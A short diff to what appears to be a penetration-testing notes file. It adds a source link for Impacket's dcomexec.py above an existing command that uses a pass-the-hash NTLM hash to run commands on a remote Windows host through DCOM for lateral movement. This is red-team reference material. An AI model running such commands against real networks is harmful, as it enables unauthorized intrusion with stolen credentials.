@@ -1,3 +1,6 @@
+# source
+https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/dcomexec.py
+
 # lateral movement using DCOM endpoints (example MMC20.Application, ShellWindows, ShellBrowserWindow)
 python3 dcomexec.py -hashes :<ntlmHash> <domain>/<user>@<rhost>
 
